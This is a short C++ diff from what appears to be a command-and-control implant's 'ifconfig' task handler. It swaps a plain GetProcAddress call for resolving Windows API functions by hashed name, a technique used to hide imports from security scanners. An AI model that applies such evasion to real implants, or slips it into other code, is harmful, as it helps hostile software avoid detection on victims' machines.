@@ -55,8 +55,8 @@ auto declfn starburst::cmd_ifconfig(
     }
 
     auto pGetAdaptersInfo = reinterpret_cast<fn_GetAdaptersInfo>(
-        inst.kernel32.GetProcAddress( h_iphlpapi,
-            symbol<LPCSTR>( "GetAdaptersInfo" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_iphlpapi ),
+            expr::hash_string( "GetAdaptersInfo" ) ) );
     if ( !pGetAdaptersInfo ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetAdaptersInfo not found" ) ) );
